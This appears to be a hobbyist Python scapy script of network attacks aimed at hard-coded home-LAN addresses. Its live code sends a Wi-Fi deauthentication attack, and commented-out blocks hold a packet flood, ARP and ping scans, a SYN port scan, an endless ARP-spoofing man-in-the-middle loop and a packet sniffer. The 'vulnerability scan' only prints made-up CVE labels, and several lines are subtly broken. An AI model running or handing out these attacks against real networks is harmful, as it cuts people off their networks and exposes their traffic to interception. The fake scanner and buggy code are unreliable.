from scapy.all import *

target_ip = "192.168.100.21"
router_ip = "192.168.100.1"
subnet = "192.168.100.0/24"

target_mac = "34:36:54:A5:C9:94"
target_ssid = ""

start_port = 1
end_port = 65535
open_port = []

#deauthentication attack
deauth_frame = RadioTap()/Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
send_packets = sendp(deauth_frame, iface="wlp1s0", count=30, inter=0.1)
print(deauth_frame.summary())

#crafting malicious packet
"""
command = b"A" * 1000 
send_packet = IP(dst=target_ip)/TCP(sport=8080,dport=443)/Raw(load=command)
request = sendp(send_packet, count=200)
"""

#arp scanning localnet devices
"""
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
answered,_= srp(arp_request, timeout=2, verbose=0)
for send, recv in answered:
    print(recv.psrc, recv.hwsrc)
"""

#ping probe scan
"""
pkt = IP(dst=target_ip)/ICMP()
response = sr1(pkt, timeout=2)

if response:
    print("[+] ping packet successfully requested! received from : ", response.src)
else:
    print("[-] response failed!")
"""


#vulnerability scanning idea
"""
def check_cve_vulnerabilities(target_ip):
    cve_vulnerabilities = {
        "CVE-2021-1234": "Buffer overflow vulnerability",
        "CVE-2021-5678": "SQL injection vulnerability"
    }

    for cve, description in cve_vulnerabilities.items():
        print(f"[+] ......checking {cve} on {target_ip} : {description}")

check_cve_vulnerabilities(target_ip)
"""
#port scanning
"""
for port in range(start_port, end_port + 1):
    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1, verbose=0)
    if response is not None:
        if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            open_ports.append(port)

if open_ports:
    print("[+] ports open from target ip {target_ip} : {open_ports}")
else:
    print(f"[-] no ports found : {target_ip}")
"""

#arp attack arpspoofing
"""
arp_response_victim = ARP(pdst=target_ip, psrc=router_ip, op=2)
arp_response_router = ARP(pdst=router_ip, psrc=target_ip, op=2)

while True:
    if True:
        send(arp_response_victim, verbose=0)
        send(arp_response_router, verbose=0)
        time.sleep(2)
        print("[+] arpspoofing attack successfully performed!")
    else:
        print("[+] attack failed!")
"""

#packet sniffing
"""
def packet_sniffer(packet):
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        print(f"ip address packet : {src_ip} and the destination : {dst_ip}")

sniff(prn=packet_sniffer, count=10)
"""

